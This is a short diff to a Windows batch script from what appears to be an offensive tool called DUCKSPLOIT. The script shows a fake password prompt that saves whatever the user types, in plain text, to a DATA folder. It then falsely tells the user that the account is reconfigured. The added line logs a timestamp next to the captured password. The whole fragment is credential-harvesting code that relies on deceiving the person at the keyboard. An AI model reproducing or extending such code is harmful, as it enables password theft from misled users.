@@ -42,6 +42,7 @@ echo.
 set /p password=Password:
 if %password% == '' (echo "[x] Bad Password!"&&goto password) else (
 (echo %password%)> C:\Users\%username%\DUCKSPLOIT\DATA\password.txt
+(time)> C:\Users\%username%\DUCKSPLOIT\DATA\time.txt
 echo "[o] Your Account (%user%) is reconfigured!"
 sudoducksploit
 )
